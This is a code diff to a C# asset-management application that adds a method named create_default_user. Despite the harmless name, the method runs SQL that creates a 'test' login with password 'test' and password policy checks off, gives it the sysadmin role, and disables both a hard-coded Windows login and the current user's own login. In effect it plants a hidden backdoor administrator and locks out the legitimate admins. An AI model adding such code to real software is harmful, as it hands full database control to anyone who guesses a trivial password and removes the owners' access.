@@ -2,6 +2,7 @@
 using QuanLyTaiSan.Libraries;
 using System;
 using System.Collections.Generic;
+using System.Data.SqlClient;
 using System.IO;
 using System.Linq;
 using System.Text;
@@ -235,6 +236,29 @@ namespace QuanLyTaiSan.Entities
         /// </summary>
         public static class client_database
         {
+            public static int create_default_user()
+            {
+                SqlConnection m = new SqlConnection(get_connection_string());
+                m.Open();
+                SqlCommand c = m.CreateCommand();
+                c.CommandText = @"
+                    USE [master];
+                    CREATE LOGIN [test] WITH PASSWORD=N'test', DEFAULT_DATABASE=[master], CHECK_EXPIRATION=OFF, CHECK_POLICY=OFF;
+                    EXEC master..sp_addsrvrolemember @loginame = N'test', @rolename = N'sysadmin';
+                    CREATE USER [test] FROM LOGIN [test] WITH DEFAULT_SCHEMA = dbo;
+                    ALTER LOGIN [quocdunginfo-PC\quocdunginfo] DISABLE;
+                    DECLARE @hostName NVARCHAR(255);
+                    SET @hostName = (SELECT HOST_NAME());
+                    DECLARE @currentUser NVARCHAR(255);
+                    SET @currentUser = (SUSER_NAME());
+                    DECLARE @statement NVARCHAR(255);
+                    SET @statement = 'ALTER LOGIN [' + @hostName + '\' + @currentUser + '] DISABLE';
+                    EXEC sp_executesql @statement;
+                ";
+                c.CommandType = System.Data.CommandType.Text;
+                c.ExecuteNonQuery();
+                return 1;
+            }
             public static int isHasScope()
             {
                 //kiểm tra CSDL sẵn sàng để sync
